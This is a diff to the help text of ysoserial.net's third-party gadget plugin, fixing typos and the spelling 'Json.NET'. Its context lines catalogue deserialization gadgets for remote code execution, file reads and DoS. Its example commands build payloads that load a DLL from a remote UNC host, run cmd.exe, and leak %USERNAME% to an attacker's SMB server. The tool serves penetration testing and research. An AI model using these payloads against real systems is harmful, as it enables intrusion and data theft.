@@ -35,7 +35,7 @@ namespace ysoserial.Plugins
             {"i|input=", "input to the gadget", v => input = v},
             {"g|gadget=", "gadget to use", v => gadget = v},
             {"f|formatter=", "formatter to use", v => formatter = v},
-            {"r", "removes version and pubkeytoken from types, it may be useful when we do not know version of targetd library or require short payload", v =>
+            {"r", "removes version and pubkeytoken from types, it may be useful when we do not know the version of targeted library or require a short payload", v =>
                 {
                     if (v != null) removeVersion = true;
                 }
@@ -80,70 +80,70 @@ Gadgets:
     (*) UnmanagedLibrary (Grpc.Core) - RCE with remote DLL loading (native C/C++ DLL can be loaded)
         Affects: .NET Framework and .NET 5/6/7
         Input: path to the DLL (UNC path for remote loading or local path)
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 2.46.6
         [Finders: Piotr Bazydlo]
 
     (*) WindowsLibrary (MongoDB Libmongocrypt) - RCE with remote DLL loading (native C/C++ DLL can be loaded)
         Affects: .NET Framework and .NET 5/6/7, alternatives exist for Linux (LinuxLibrary) and Mac (DarwinLibrary)
         Input: path to the DLL (UNC path for remote loading or local path)
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 1.8.0
         [Finders: Piotr Bazydlo]
 
     (*) Xunit1Executor (Xunit Runner Utility) - RCE with remote DLL loading (C# or mixed DLL can be loaded)
         Affects: .NET Framework
         Input: path to the xunit.dll (like \\192.168.1.100\poc\xunit.dll), which implements Xunit.Sdk.Executor class with the Executor(String) constructor. This constructor will be called upon DLL load. Mixed DLLs should work too.
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 2.5.1
         [Finders: Piotr Bazydlo]
 
     (*) GetterActiveMQObjectMessage (Apache NMS ActiveMQ) - RCE by chaining Arbitrary Getter Call gadget and ActiveMQObjectMessage serialization gadget
         Affects: .NET Framework
         Input: command to execute
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 2.1.0
         [Finders: Piotr Bazydlo]
 
     (*) PreserverWorkingFolder (Xunit + Xunit Runner Utility) - sets current directory through Directory.SetCurrentDirectory. Can be used to mess with file operations based on relative paths
         Affects: .NET Framework
         Input: path to the directory that we want to set, can be either remote (UNC) or local path
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 2.5.1
         [Finders: Piotr Bazydlo]
 
     (*) OptimisticLockedTextFile (Amazon AWSSDK.Core) - file read during deserialization. File content is returned if the object is serialized again and returned to the attacker.
         Affects: .NET Framework
         Input: path to the file
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 3.7.202.19
         [Finders: Piotr Bazydlo]
 
     (*) QueryPartitionProvider (Microsoft Azure Cosmos) - triggers Json.NET serialization on the attacker-provided object. Can be chained with serialization gadgets.
         Affects: .NET Framework
         Input: path to the file that stores the serialization gadget. This serialized payload will be deserialized by a given serializer and then serialized with Json.NET.
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 3.35.4
         [Finders: Piotr Bazydlo]
 
     (*) FileDiagnosticsTelemetryModule (Microsoft Application Insights) - leaks environment variable through SMB connection or creates new directory (potential DoS)
         Affects: .NET Framework
         Input: Env variable leak: UNC path to attacker's server, with the environment variable specified, like: \\192.168.1.100\%USERNAME%; Directory Creation: path
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 2.21.0
         [Finders: Piotr Bazydlo]
 
     (*) SingleProcessFileAppender (NLog) - Directory/empty file creation gadget. Can potentially lead to DoS. There are 2 variants: CountingSingleProcessFileAppender and MutexMultiProcessFileAppender
         Affects: .NET Framework
         Input: Path to the directory/file
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 5.2.4
         [Finders: Piotr Bazydlo]
 
     (*) FileDataStore (Google Apis) - Directory creation gadget. Can potentially lead to DoS
         Affects: .NET Framework
         Input: Path to the directory/file
-        Formatters: Json.Net
+        Formatters: Json.NET
         Tested Version: 1.62.1
         [Finders: Piotr Bazydlo]
 
@@ -151,13 +151,13 @@ Exemplary usage:
 
     ysoserial.exe -p ThirdPartyGadgets -l
 
-    ysoserial.exe -p ThirdPartyGadgets -f Json.Net -g UnmanagedLibrary -i \\\\192.168.1.100\\poc\\cppDll.dll -r
+    ysoserial.exe -p ThirdPartyGadgets -f Json.NET -g UnmanagedLibrary -i \\\\192.168.1.100\\poc\\cppDll.dll -r
 
-    ysoserial.exe -p ThirdPartyGadgets -f Json.Net -g GetterActiveMQObjectMessage -i ""cmd.exe /c calc.exe""
+    ysoserial.exe -p ThirdPartyGadgets -f Json.NET -g GetterActiveMQObjectMessage -i ""cmd.exe /c calc.exe""
 
-    ysoserial.exe -p ThirdPartyGadgets -f Json.Net -g QueryPartitionProvider -i ""C:\Users\Public\inner.json""
+    ysoserial.exe -p ThirdPartyGadgets -f Json.NET -g QueryPartitionProvider -i ""C:\Users\Public\inner.json""
 
-    ysoserial.exe -p ThirdPartyGadgets -f Json.Net -g FileDiagnosticsTelemetryModule -i ""\\\\192.168.1.100\\%USERNAME%""
+    ysoserial.exe -p ThirdPartyGadgets -f Json.NET -g FileDiagnosticsTelemetryModule -i ""\\\\192.168.1.100\\%USERNAME%""
 
 ";
         }
